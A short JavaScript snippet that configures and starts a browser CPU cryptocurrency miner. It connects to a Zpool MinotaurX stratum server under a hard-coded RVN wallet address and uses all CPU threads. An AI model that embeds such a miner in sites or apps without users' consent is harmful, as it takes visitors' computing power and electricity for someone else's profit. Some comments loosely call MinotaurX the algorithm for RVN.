import * as cpuWebMiner from "@marco_ciaramella/cpu-web-miner";

const stratum = {
    server: "minotaurx.na.mine.zpool.ca", // Zpool's MinotaurX server
    port: 7019,                          // RVN port on Zpool
    worker: "RNZaqoBye9Kye6USMC55ve52pBxo168xMU", // Your RVN address
    password: "c=RVN",                   // 'c=RVN' specifies coin
    ssl: false                           // Zpool doesn't use SSL for this port
}

cpuWebMiner.start(
    cpuWebMiner.minotaurx,               // Algorithm for RVN
    stratum,
    null,
    cpuWebMiner.ALL_THREADS,             // Use all available CPU threads
    work => console.log('New work:', work),
    hashrate => console.log('Hashrate:', hashrate + ' H/s'),
    error => console.error('Error:', error)
);
